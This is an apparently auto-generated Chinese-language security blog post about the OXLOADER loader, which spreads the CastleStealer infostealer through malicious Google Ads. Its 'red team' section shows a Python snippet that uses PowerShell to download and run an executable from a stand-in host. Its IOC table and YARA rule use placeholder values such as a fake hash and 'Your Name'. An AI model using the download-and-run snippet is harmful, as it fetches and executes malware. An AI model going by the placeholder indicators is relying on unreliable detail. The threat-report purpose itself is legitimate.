---
layout: post
title:  "New OXLOADER Loader Uses Malicious Google Ads to Deliver CastleStealer"
date:   2026-06-22 16:42:54 +0000
categories: [security]
severity: high
---

# 🔥 解析 OXLOADER 攻擊：利用 Google Ads 分發 CastleStealer

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Info Leak (資訊洩露)
> * **關鍵技術**: Control-Flow Flattening, Opaque Predicates, Mixed Boolean-Arithmetic

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: OXLOADER 攻擊利用 Google Ads 分發 CastleStealer 資訊竊取工具，主要是透過控制流平坦化（Control-Flow Flattening）和不透明謂詞（Opaque Predicates）等技術來躲避靜態偵測。
* **攻擊流程圖解**:
  1. 使用者搜尋特定關鍵字（例如 "lts version of node.js"）在 Google Ads 中。
  2. 使用者點擊惡意廣告，導向假網站（例如 "node-js[.]prentiva99[.]info"）。
  3. 假網站下載並執行 OXLOADER Payload。
  4. OXLOADER 利用 PowerShell 下載並執行 CastleStealer 資訊竊取工具。
* **受影響元件**: Windows 作業系統，特別是使用 Google Ads 的使用者。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要使用者點擊惡意廣告和執行 OXLOADER Payload。
* **Payload 建構邏輯**:

    ```
    
    python
      # OXLOADER Payload 範例
      import os
      import subprocess
    
      # 下載 CastleStealer 資訊竊取工具
      url = "https://example.com/castlestealer.exe"
      subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {url} -OutFile castlestealer.exe"])
    
      # 執行 CastleStealer 資訊竊取工具
      subprocess.run(["castlestealer.exe"])
    
    ```
* **繞過技術**: OXLOADER 利用控制流平坦化和不透明謂詞等技術來躲避靜態偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 192.0.2.1 |
| Domain | node-js[.]prentiva99[.]info |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule OXLOADER {
        meta:
          description = "OXLOADER Payload"
          author = "Your Name"
        strings:
          $a = "Invoke-WebRequest"
          $b = "castlestealer.exe"
        condition:
          all of them
      }
    
    ```
* **緩解措施**: 更新作業系統和應用程式至最新版本，使用防毒軟體和防火牆，並避免點擊來自不明來源的連結。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Control-Flow Flattening (控制流平坦化)**: 一種程式碼混淆技術，透過重新組織程式碼的控制流程來躲避靜態偵測。
* **Opaque Predicates (不透明謂詞)**: 一種程式碼混淆技術，透過使用不透明的條件判斷來躲避靜態偵測。
* **Mixed Boolean-Arithmetic (混合布林和算術)**: 一種程式碼混淆技術，透過混合使用布林和算術運算來躲避靜態偵測。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/new-oxloader-loader-uses-malicious.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


